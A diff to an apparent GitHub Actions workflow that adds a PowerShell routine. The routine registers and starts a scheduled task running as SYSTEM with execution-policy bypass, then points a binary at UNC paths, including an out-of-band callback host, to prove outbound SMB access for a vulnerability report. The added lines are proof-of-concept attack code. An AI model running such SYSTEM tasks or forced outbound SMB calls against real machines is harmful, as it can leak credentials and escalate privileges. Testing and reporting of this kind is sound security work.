@@ -54,13 +54,28 @@ jobs:
             Get-Content $parent -ErrorAction SilentlyContinue
             Get-Content $child -ErrorAction SilentlyContinue
           }
+          function Run-SystemRaw([string]$name,[string]$unc,[string]$out){
+            $cmd="& '$exe' --child '$unc' *> '$out'"
+            $a=New-ScheduledTaskAction -Execute powershell.exe -Argument "-NoProfile -NonInteractive -ExecutionPolicy Bypass -Command `"$cmd`""
+            $p=New-ScheduledTaskPrincipal -UserId SYSTEM -LogonType ServiceAccount -RunLevel Highest
+            Register-ScheduledTask -TaskName $name -Action $a -Principal $p -Force | Out-Null
+            Start-ScheduledTask $name
+            for($i=0;$i -lt 60;$i++){Start-Sleep 1;$st=Get-ScheduledTaskInfo $name;if($st.LastRunTime -gt [datetime]::MinValue -and (Get-ScheduledTask $name).State -ne 'Running'){break}}
+            Get-ScheduledTaskInfo $name | Format-List *
+            Get-Content $out -ErrorAction SilentlyContinue
+          }
           Write-Output "PRIVATE_IP=$ip"
+          Write-Output '=== RESTRICTED FIRST ==='
           Run-System beprof-local "\\$ip\owned\marker.txt" C:/proof/local-child.txt C:/proof/local-parent.txt
           Start-Sleep 4
-          Run-System beprof-oob "\\j9adzdnyijwvlprf--beprof1787402221.oob.blackmail.zip\owned\marker.txt" C:/proof/oob-child.txt C:/proof/oob-parent.txt
+          Write-Output '=== UNRESTRICTED SYSTEM CONTROL ==='
+          Run-SystemRaw beprof-control "\\$ip\owned\marker.txt" C:/proof/control-child.txt
+          Start-Sleep 4
+          Run-System beprof-oob "\\j9adzdnyijwvlprf--beprofctl1787402578.oob.blackmail.zip\owned\marker.txt" C:/proof/oob-child.txt C:/proof/oob-parent.txt
           Start-Sleep 8
           Write-Output '=== SMB CONTAINER LOG ==='; docker logs smbproof 2>&1
-          Write-Output '=== LOCAL CHILD ==='; Get-Content C:/proof/local-child.txt -ErrorAction SilentlyContinue
+          Write-Output '=== LOCAL RESTRICTED CHILD ==='; Get-Content C:/proof/local-child.txt -ErrorAction SilentlyContinue
+          Write-Output '=== LOCAL CONTROL CHILD ==='; Get-Content C:/proof/control-child.txt -ErrorAction SilentlyContinue
           Write-Output '=== OOB CHILD ==='; Get-Content C:/proof/oob-child.txt -ErrorAction SilentlyContinue
           exit 0
       - name: Upload proof
